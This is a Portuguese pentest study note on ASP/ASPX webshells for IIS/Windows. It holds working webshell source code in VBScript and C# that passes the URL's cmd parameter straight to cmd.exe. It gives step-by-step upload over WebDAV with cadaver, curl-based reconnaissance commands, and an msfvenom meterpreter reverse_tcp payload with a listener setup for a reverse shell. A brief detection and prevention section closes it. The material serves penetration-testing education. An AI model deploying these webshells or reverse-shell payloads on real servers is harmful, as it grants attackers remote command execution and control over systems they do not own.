# 🐚 ASP Webshell — Conceito e Uso em Pentest

> Uma webshell é um script hospedado no servidor que permite executar comandos do sistema operacional via requisições HTTP.
> Em ambientes IIS/Windows, webshells em ASP/ASPX são o vetor padrão após obter upload.

---

## 🧠 O Que é uma Webshell

Uma **webshell** é um arquivo de script (ASP, PHP, JSP, ASPX) enviado para um servidor web que, quando acessado via browser ou curl, executa comandos no sistema operacional do servidor.

**Fluxo conceitual:**
```
Upload da webshell via WebDAV / file upload / FTP
        ↓
Acesso via HTTP: http://IP/shell.asp?cmd=whoami
        ↓
Servidor processa o script ASP
        ↓
ASP executa o comando no sistema operacional
        ↓
Resultado do comando retornado no HTTP response
```

---

## 🔢 Tipos de Webshell por Tecnologia

| Extensão | Servidor | Sistema |
|---------|---------|---------|
| `.asp` | IIS (ASP clássico) | Windows |
| `.aspx` | IIS (ASP.NET) | Windows |
| `.php` | Apache / nginx / IIS+PHP | Linux ou Windows |
| `.jsp` | Tomcat / JBoss / GlassFish | Linux ou Windows |
| `.cfm` | ColdFusion | Windows geralmente |

**Para ambientes IIS/Windows → `.asp` ou `.aspx`**

---

## 📝 ASP Webshell — Estrutura Básica

O ASP clássico usa **VBScript** ou JScript para executar código no servidor.

### Conceito (ASP clássico — VBScript)
```asp
<%
  Dim cmd, shell, result
  cmd = Request.QueryString("cmd")    ' Pega o parâmetro ?cmd= da URL
  If cmd <> "" Then
    Set shell = CreateObject("WScript.Shell")  ' Cria objeto de shell Windows
    Set result = shell.Exec("cmd.exe /c " & cmd)  ' Executa o comando
    Response.Write result.StdOut.ReadAll()    ' Retorna o output
  End If
%>
```

**Acesso:**
```
http://IP/shell.asp?cmd=whoami
http://IP/shell.asp?cmd=ipconfig
http://IP/shell.asp?cmd=net+users
```

---

### Variante com WScript.Shell (mais comum)
```asp
<%
Set oSh = Server.CreateObject("WScript.Shell")
Set oExec = oSh.Exec("cmd.exe /c " & Request("cmd"))
Response.Write oExec.StdOut.ReadAll
%>
```

---

### ASPX Webshell — ASP.NET (C#)
```aspx
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<% 
  string cmd = Request.QueryString["cmd"];
  if (cmd != null) {
    Process p = new Process();
    p.StartInfo.FileName = "cmd.exe";
    p.StartInfo.Arguments = "/c " + cmd;
    p.StartInfo.UseShellExecute = false;
    p.StartInfo.RedirectStandardOutput = true;
    p.Start();
    Response.Write(p.StandardOutput.ReadToEnd());
  }
%>
```

---

## 🛠️ Webshells Prontas no Kali

O Kali Linux inclui webshells prontas:

```bash
# Listar webshells disponíveis
ls /usr/share/webshells/

# Estrutura:
/usr/share/webshells/
├── asp/
│   ├── cmd.asp          ← webshell ASP simples
│   ├── cmdasp.asp       ← versão com interface HTML
│   └── cmd-asp-5.1.asp
├── aspx/
│   └── cmdasp.aspx
├── php/
│   ├── php-reverse-shell.php
│   └── simple-backdoor.php
├── jsp/
│   └── cmd.jsp
└── perl/
    └── perlcmd.cgi
```

```bash
# Ver conteúdo da webshell ASP padrão
cat /usr/share/webshells/asp/cmd.asp

# Copiar para usar
cp /usr/share/webshells/asp/cmd.asp /tmp/shell.asp
```

---

## 🔁 Workflow Completo — Do Upload ao RCE

### 1. Confirmar WebDAV e extensão executável
```bash
davtest -url http://IP/ -cleanup
# Resultado: PUT asp SUCCEED + EXEC asp SUCCEED
```

### 2. Copiar webshell do Kali
```bash
cp /usr/share/webshells/asp/cmd.asp /tmp/shell.asp
```

### 3. Upload via Cadaver
```bash
cadaver http://IP/
dav:/> put /tmp/shell.asp
dav:/> ls  # confirmar que está lá
dav:/> exit
```

### 4. Verificar acesso e execução
```bash
curl "http://IP/shell.asp?cmd=whoami"
curl "http://IP/shell.asp?cmd=ipconfig"
curl "http://IP/shell.asp?cmd=net+users"
```

### 5. Reconhecimento inicial via webshell
```bash
# Sistema e usuário
curl "http://IP/shell.asp?cmd=whoami"
curl "http://IP/shell.asp?cmd=hostname"
curl "http://IP/shell.asp?cmd=systeminfo"

# Rede
curl "http://IP/shell.asp?cmd=ipconfig+/all"
curl "http://IP/shell.asp?cmd=netstat+-an"
curl "http://IP/shell.asp?cmd=net+user"
curl "http://IP/shell.asp?cmd=net+localgroup+administrators"

# Navegação
curl "http://IP/shell.asp?cmd=dir+C:\\"
curl "http://IP/shell.asp?cmd=dir+C:\\Users"
curl "http://IP/shell.asp?cmd=type+C:\\Users\\Administrator\\Desktop\\flag.txt"
```

---

## 🔄 Evoluindo da Webshell para Shell Reversa

A webshell é limitada — cada comando é uma requisição HTTP separada. O objetivo é evoluir para uma **shell reversa interativa**.

### Via Metasploit (msfvenom)
```bash
# Gerar payload executável
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=SEU_IP \
  LPORT=4444 \
  -f exe > /tmp/shell.exe

# Subir o payload via WebDAV
cadaver http://IP/
dav:/> put /tmp/shell.exe

# Configurar listener no Metasploit
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST SEU_IP
set LPORT 4444
run

# Executar via webshell
curl "http://IP/shell.asp?cmd=shell.exe"
```

### Via PowerShell (sem arquivo)
```bash
# Comando PowerShell encoded na URL (espaços viram +)
# One-liner de reverse shell PowerShell na webshell
curl "http://IP/shell.asp?cmd=powershell+-e+BASE64_ENCODED_COMMAND"
```

---

## 🎯 Contexto de Execução — Quem Sou Eu?

Após acesso via webshell, o primeiro comando é sempre `whoami`:

| Resultado | Significado | Implicação |
|-----------|------------|-----------|
| `nt authority\system` | Privilégio máximo | Controle total |
| `nt authority\network service` | Serviço de rede | Privilégios limitados |
| `iis apppool\defaultapppool` | Conta do Application Pool | Precisa de escalonamento |
| `administrator` | Admin local | Quase controle total |
| `usuario-comum` | Usuário sem privilégio | Precisa de privesc |

---

## ⚠️ Detecção e Defesa

**Como detectar webshells (defesa):**
```
- Monitorar logs IIS: GET /shell.asp?cmd=
- Alertar em extensões executáveis em diretórios de upload
- File integrity monitoring (FIM) em wwwroot
- EDR detecta WScript.Shell e Process.Start em contexto IIS
- Desabilitar WebDAV se não for necessário
- Restringir quais extensões o IIS executa em diretórios de upload
```

**Como prevenir:**
- Desabilitar WebDAV completamente (`sc stop WebClient`)
- Configurar IIS para não executar scripts em diretórios de upload
- Remover handler de ASP em diretórios não-essenciais
- Aplicar `Request Filtering` no IIS para bloquear extensões perigosas

---

## 📌 Relacionados

- [[IIS — Internet Information Services]]
- [[Cadaver — Cliente WebDAV]]
- [[DAVTest — Testando WebDAV]]
- [[Metasploit — Fundamentos e Arquitetura]]
- [[Top 10 Vulnerabilidades — Servicos Windows]]

#exploração #windows #iis #webshell #webdav
